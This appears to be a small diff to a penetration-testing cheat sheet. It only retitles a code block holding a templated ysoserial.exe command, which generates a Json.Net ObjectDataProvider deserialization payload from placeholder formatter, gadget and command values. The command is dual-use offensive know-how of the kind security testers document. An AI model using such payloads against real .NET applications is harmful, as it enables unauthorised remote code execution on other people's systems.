@@ -23,7 +23,7 @@ var validation_key
 
 Generate a Json.Net ObjectDataProvider payload.
 
-```cmd title:"Generate Json.Net ObjectDataProvider payload"
+```cmd title:"Ysoserial.Net Generate Json.Net ObjectDataProvider payload"
 ysoserial.exe -f "$formatter" -g "$gadget" -o raw -c "$command" -t
 ```
 <!-- cheat
